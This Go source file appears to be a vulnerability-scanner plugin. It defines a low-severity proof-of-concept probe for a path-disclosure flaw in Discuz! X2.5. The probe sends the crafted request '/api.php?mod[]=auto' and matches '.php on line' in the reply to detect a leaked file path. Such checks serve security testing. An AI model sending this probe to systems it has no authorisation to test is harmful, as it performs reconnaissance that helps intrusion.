package poc

func (Info *PocInfo) Discuz_V25_Api_INFO_Init() {
	poc := PocInfo{}

	// 设置poc-Info信息
	poc.Info.ID = ""
	poc.Info.Target = "discuz"
	poc.Info.Type = "INFO"
	poc.Info.Name = "Discuz! X2.5 api.php path INFO"
	poc.Info.Level = 3
	poc.Info.Author = "youzai"

	// 设置poc-Poc信息
	poc.Poc.Proto = "http"
	poc.Poc.Method = "GET"
	poc.Poc.Path = []string{"/api.php?mod[]=auto"}
	poc.Poc.Param = []string{"mod[]"}
	poc.Poc.Header = nil
	poc.Poc.Data = nil
	poc.Poc.Word = []string{".php on line"}

	// 设置poc-Config信息
	poc.Config.Customize = false

	PocStruct = append(PocStruct, poc)
}
